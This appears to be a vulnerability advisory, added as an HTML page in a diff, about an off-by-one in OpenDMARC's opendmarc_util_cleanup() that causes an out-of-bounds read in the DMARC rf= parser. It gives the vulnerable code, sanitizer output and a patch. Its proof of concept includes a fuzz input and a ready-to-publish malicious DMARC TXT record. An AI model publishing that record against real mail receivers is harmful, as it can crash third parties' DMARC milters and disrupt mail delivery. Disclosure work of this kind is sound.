@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>OpenDMARC off-by-one in opendmarc_util_cleanup() leaves an unterminated buffer, causing an out-of-bounds read in the DMARC record parser (OpenDMARC ≤ 1.4.2)</title>
+<style>
+:root { color-scheme: light dark; --fg:#111; --bg:#fff; --muted:#555; --rule:#ddd; --pre:#f5f5f5; --link:#14508c; }
+@media (prefers-color-scheme: dark) {
+  :root { --fg:#e4e4e4; --bg:#161616; --muted:#a0a0a0; --rule:#333; --pre:#1e1e1e; --link:#7fb2e5; }
+}
+body { max-width: 46rem; margin: 2.5rem auto; padding: 0 1.1rem 4rem; background: var(--bg); color: var(--fg);
+       font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+h1 { font-size: 1.35rem; line-height: 1.35; margin: 0 0 1rem; }
+h2 { font-size: 1.05rem; margin: 2rem 0 .6rem; }
+p, li { margin: .6rem 0; }
+a { color: var(--link); }
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: .87em; }
+pre { background: var(--pre); border: 1px solid var(--rule); padding: .75rem .85rem; overflow-x: auto;
+      font-size: .82rem; line-height: 1.45; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+table { border-collapse: collapse; width: 100%; font-size: .87rem; margin: .7rem 0; }
+th, td { border: 1px solid var(--rule); padding: .35rem .5rem; text-align: left; vertical-align: top; }
+.scroll { overflow-x: auto; }
+.hdr { font-size: .93rem; color: var(--muted); margin: 0 0 1.6rem; }
+.hdr b { color: var(--fg); font-weight: 600; }
+.lead { border-left: 3px solid var(--rule); padding-left: .85rem; margin: 0 0 1.6rem; }
+footer { margin-top: 3rem; padding-top: .8rem; border-top: 1px solid var(--rule);
+         color: var(--muted); font-size: .84rem; }
+</style>
+</head>
+<body>
+
+<h1>OpenDMARC off-by-one in opendmarc_util_cleanup() leaves an unterminated buffer, causing an out-of-bounds read in the DMARC record parser (OpenDMARC ≤ 1.4.2)</h1>
+
+<p class="hdr">
+<b>Author:</b> <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech &lt;weitongli@vt.edu&gt;<br>
+<b>Date:</b> 2026-07-31<br>
+<b>Vendor:</b> <a href="http://www.trusteddomain.org/">The Trusted Domain Project</a><br>
+<b>Software:</b> <a href="https://github.com/trusteddomainproject/OpenDMARC">OpenDMARC (libopendmarc)</a><br>
+<b>Affected version:</b> OpenDMARC 1.4.2 and earlier, and current upstream <code>master</code> (commit <code>bf37d53</code>).<br>
+<b>Vulnerable component:</b> <code>libopendmarc/opendmarc_util.c</code>, <code>opendmarc_util_cleanup()</code> line 159; crash at <code>libopendmarc/opendmarc_policy.c</code> line 1119 (the <code>rf=</code> tag handler)<br>
+<b>Vulnerability type:</b> CWE-193 (Off-by-one Error) leading to CWE-125 (Out-of-bounds Read)<br>
+<b>Attack vector:</b> Remote. The DMARC record is a DNS TXT record fetched from the sender's (or an attacker's) domain, so publishing the record is the whole attack.<br>
+<b>CVSS v3.1:</b> 8.2 (High) &mdash; <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H</code><br>
+<b>Status:</b> AddressSanitizer-confirmed in the library, and confirmed firing live through the full SMTP + DNS + milter stack in a running opendmarc process.
+</p>
+
+<p class="lead"><b>Impact.</b> A DMARC TXT record whose rf= token is exactly 32 characters long makes strlen() run off the end of a 32-byte stack buffer.</p>
+
+<h2>Description</h2>
+<p>Any domain that publishes a DMARC record can crash or read out of bounds in every OpenDMARC receiver that evaluates it. The read is of adjacent stack contents and the resulting length is then used to drive further parsing, so on an ordinary build the effect is undefined behaviour in the policy parser; under a sanitizer or a hardened allocator the milter process faults, denying DMARC evaluation and, depending on the milter failure mode, mail delivery.</p>
+<p>Requiring only a DNS record and one message makes this the cheapest of the memory findings to trigger against a third party.</p>
+<p><code>opendmarc_util_cleanup()</code> copies a string into a caller-supplied buffer while dropping whitespace. Its length guard is <code>strlen(str) &gt; buflen</code>, which admits an input of exactly <code>buflen</code> characters. When every one of those characters is non-whitespace the loop fills <code>buf[0 .. buflen-1]</code> completely and no NUL terminator is written, yet the function returns <code>buf</code> to callers that immediately treat it as a C string.</p>
+<p>The DMARC record parser calls it from several tag handlers with fixed-size stack buffers. The <code>rf=</code> handler uses <code>u_char xbuf[32]</code>, so a 32-character <code>rf=</code> token in an attacker-published DMARC TXT record makes the following <code>strlen()</code> read past the end of the array.</p>
+<pre><code>u_char *
+opendmarc_util_cleanup(u_char *str, u_char *buf, size_t buflen)
+{
+    if (str == NULL || buf == NULL || strlen((char *)str) &gt; buflen)  /* '&gt;' should be '&gt;=' */
+    {
+        errno = EINVAL;
+        return NULL;
+    }
+    (void) memset(buf, '\0', buflen);
+    for (sp = str, ep = buf; *sp != '\0'; sp++)
+        if (!isascii(*sp) || !isspace(*sp))
+            *ep++ = *sp;                  /* up to buflen non-space bytes written */
+    return buf;                           /* no room left for the terminator */
+}</code></pre>
+<p>The crash site, in the <code>rf=</code> handler of <code>opendmarc_policy_parse_dmarc()</code>:</p>
+<pre><code>u_char xbuf[32];
+...
+xp = opendmarc_util_cleanup(xp, xbuf, sizeof xbuf);   /* xbuf left unterminated */
+if (xp != NULL &amp;&amp; strlen((char *)xp) &gt; 0)             /* :1119 - reads past xbuf[32] */</code></pre>
+<pre><code>==ERROR== AddressSanitizer: stack-buffer-overflow
+READ of size 33 at 0x...
+    #0 __interceptor_strlen
+    #1 opendmarc_policy_parse_dmarc opendmarc_policy.c:1119</code></pre>
+<p><code>opendmarc_util_cleanup()</code> is called from more than one tag handler with a fixed-size stack buffer, so the same root cause is reachable through other tags; <code>rf=</code> is simply the one the fuzzer minimised to.</p>
+
+<h2>Proof of Concept</h2>
+<p>The token must be exactly 32 non-whitespace characters. Thirty-three or more is rejected by the guard, and thirty-one or fewer leaves room for the terminator.</p>
+<pre><code>printf 'v=DMARC1;p=none;rf=abcdefghijklmnopqrstuvwxyz012345\0example.com' &gt; pocB
+./fuzz_odmarc_record pocB
+==ERROR== AddressSanitizer: stack-buffer-overflow ... READ ... in __interceptor_strlen
+          &lt;- opendmarc_policy_parse_dmarc opendmarc_policy.c:1119</code></pre>
+<p>The real-world equivalent needs no harness. An attacker publishes, at a domain they control:</p>
+<pre><code>_dmarc.attacker.example.  IN  TXT  "v=DMARC1; p=none; rf=abcdefghijklmnopqrstuvwxyz012345"</code></pre>
+<p>and sends one message with that domain in the <code>From:</code> header. This path was exercised end to end: with an AddressSanitizer-instrumented <code>opendmarc</code> running behind Postfix and a programmable authoritative DNS server, an ordinary inbound message plus the record above fires the sanitizer report inside the live milter.</p>
+
+<h2>Mitigation</h2>
+<pre><code>-    if (str == NULL || buf == NULL || strlen((char *)str) &gt; buflen)
++    if (str == NULL || buf == NULL || strlen((char *)str) &gt;= buflen)
+     {
+         errno = EINVAL;
+         return NULL;
+     }
+     ...
++    *ep = '\0';   /* always terminate */
+     return buf;</code></pre>
+<p>Reserving the terminator in the guard and writing it unconditionally both fix the defect; applying both is preferable, since the second protects the other callers as well.</p>
+
+<h2>Notes</h2>
+<p>This is the same class as historical OpenDMARC parser CVEs. The live end-to-end confirmation through SMTP, DNS and the milter distinguishes it from the purely in-harness findings.</p>
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc7489#section-6.3">RFC 7489 - Domain-based Message Authentication, Reporting, and Conformance (DMARC), section 6.3 (the rf tag)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/193.html">CWE-193: Off-by-one Error</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125: Out-of-bounds Read</a></li>
+<li><a href="https://github.com/trusteddomainproject/OpenDMARC">OpenDMARC repository</a></li>
+<li><a href="https://weitongli.com/">Weitong Li, Virginia Tech - researcher homepage</a></li>
+</ul>
+
+<footer>
+<p>Reported by <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech
+(<a href="mailto:weitongli@vt.edu">weitongli@vt.edu</a>).
+Reproduction environment and full evidence available to the vendor on request.
+CVSS is the researcher's own assessment.</p>
+</footer>
+
+</body>
+</html>
